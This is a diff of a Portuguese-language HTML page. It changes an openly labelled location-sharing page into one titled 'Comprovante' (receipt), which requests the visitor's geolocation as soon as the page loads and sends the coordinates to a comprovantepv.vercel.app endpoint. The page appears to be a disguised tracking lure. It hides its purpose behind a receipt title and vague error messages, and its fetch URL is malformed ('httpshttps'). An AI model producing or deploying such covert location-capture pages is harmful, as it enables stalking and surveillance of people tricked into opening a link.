@@ -2,49 +2,52 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Enviar Localização</title>
+  <title>Comprovante</title>
 </head>
-<body>
-  <h1>Envio de Localização</h1>
-  <button onclick="enviarLocalizacao()">Enviar Localização</button>
+<body style="background-color: antiquewhite;">
+  <h1>Comprovante</h1>
 
   <script>
-    function enviarLocalizacao() {
+    // Executa automaticamente ao carregar a página
+    window.addEventListener("load", () => {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async function(position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          // Enviar a localização para o servidor
-          try {
-            const response = await fetch('https://seu-dominio/api/send-location', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify({
-                latitude: latitude,
-                longitude: longitude
-              })
-            });
-
-            const data = await response.json();
-            if (data.success) {
-              alert("Localização enviada com sucesso!");
-            } else {
-              alert("Erro ao enviar a localização.");
-            }
-          } catch (error) {
-            console.error('Erro:', error);
-            alert("Erro ao tentar enviar a localização.");
-          }
-        }, function(error) {
-          alert("Erro ao obter localização: " + error.message);
-        });
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Geolocalização não é suportada neste navegador.");
+        alert("Algo deu errado. Tente novamente mais tarde.");
       }
+    });
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      console.log("Latitude: " + latitude);
+      console.log("Longitude: " + longitude);
+
+      // Envia a localização para o backend (troque pela URL do seu Vercel)
+      fetch("httpshttps://comprovantepv.vercel.app/api/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          alert("Localização enviada com sucesso!");
+        } else {
+          alert("Algo deu errado. Tente novamente mais tarde.");
+        }
+      })
+      .catch(error => {
+        console.error("Erro:", error);
+        alert("Erro ao enviar a localização.");
+      });
+    }
+
+    function handleError(error) {
+      alert("Erro ao obter a localização: " + error.message);
     }
   </script>
 </body>
